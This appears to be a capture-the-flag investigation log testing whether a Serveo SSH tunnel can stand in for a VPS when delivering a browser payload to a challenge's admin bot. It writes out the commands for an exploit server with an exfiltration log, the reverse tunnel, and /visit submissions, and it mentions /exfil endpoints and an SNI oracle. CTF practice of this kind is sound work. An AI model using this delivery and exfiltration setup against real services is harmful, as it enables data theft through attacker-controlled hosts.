# Serveo Investigation 2026-03-09

Target instance:

`https://dicewallet-cc7710666977.ctfi.ng`

Goal:

Check whether the DiceWallet chain can be driven from the local machine through a Serveo tunnel instead of the public VPS.

## Setup

A temporary local serve root was prepared in `/tmp/serveo_reval` and exposed on port `8000` with:

```bash
python3 exploits/servers/exploit_server_final.py 8000 \
  --serve-root /tmp/serveo_reval \
  --exfil-log /tmp/serveo_reval/exfil.log \
  --http-log /tmp/serveo_reval/http.log \
  --exploit-path /payload.html
```

Serveo was opened with:

```bash
ssh -o StrictHostKeyChecking=no -R 80:localhost:8000 serveo.net
```

It returned:

```text
Forwarding HTTP traffic from https://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com
```

## Basic Reachability

Serveo itself worked.

External check from the VPS:

```bash
curl -ik --max-time 10 \
  'https://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=vpstest'
```

That returned `HTTP/2 200` and the local tunnel logged:

```text
[2026-03-09T12:12:22Z] 127.0.0.1 - "GET /payload.html?t=vpstest HTTP/1.1" 200 -
```

Direct checks from inside the local bot container also worked:

```bash
docker exec dicewallet-bot sh -lc \
  'wget -O- -S --timeout=10 https://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=contprobe'
docker exec dicewallet-bot sh -lc \
  'wget -O- -S --timeout=10 http://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=contprobehttp'
```

Both returned `200 OK`, and the local tunnel logged:

```text
[2026-03-09T12:13:51Z] 127.0.0.1 - "GET /payload.html?t=contprobe HTTP/1.1" 200 -
```

## Browser-Driven Bot Tests

### Real instance

Submitted:

```bash
curl -sk -X POST https://dicewallet-cc7710666977.ctfi.ng/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=stage1serveo"}'
```

Result:

- `/visit` accepted the request
- the instance returned to `activeVisits: 0`
- the local Serveo-backed server never logged `GET /payload.html?t=stage1serveo`
- no `/z-stage1serveo.js`
- no `/exfil/*`

### Local bot

Submitted:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=stage1serveolocal"}'
```

and later:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=stage1serveohttp"}'
```

The bot log showed:

```text
[bot] Visiting: https://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=stage1serveolocal
[bot] Visit complete
[bot] Visiting: http://98383a0432a69dfb-111-XXX-73-136.serveousercontent.com/payload.html?t=stage1serveohttp
[bot] Visit complete
```

But the local tunnel still did not log `payload.html` or `z-*.js` from those browser visits. The only repeated entry was a local `favicon.ico` miss:

```text
[2026-03-09T12:14:32Z] 127.0.0.1 - code 404, message File not found
[2026-03-09T12:14:32Z] 127.0.0.1 - "GET /favicon.ico HTTP/1.1" 404 -
```

## Conclusion

Serveo is reachable as a generic HTTP/HTTPS tunnel:

- the VPS can fetch through it
- the Docker container can fetch through it with `wget`

But in this environment it was **not** a reliable delivery channel for the Firefox/Selenium browser used by the bot:

- neither the local bot browser nor the real challenge bot produced a `GET /payload.html?...` through the tunnel
- so phase 1 could not be reproduced through Serveo

Even if phase 1 had worked, phase 2 would still be weaker than the VPS setup because the final solve depends on a stable raw TLS/SNI oracle on public port `1338` with query isolation by hostname token.

Practical answer:

- Serveo is not a drop-in replacement for the VPS setup used in the successful solve
- the working setup remains the public VPS on port `80` for payload delivery and `1338` for the SNI oracle
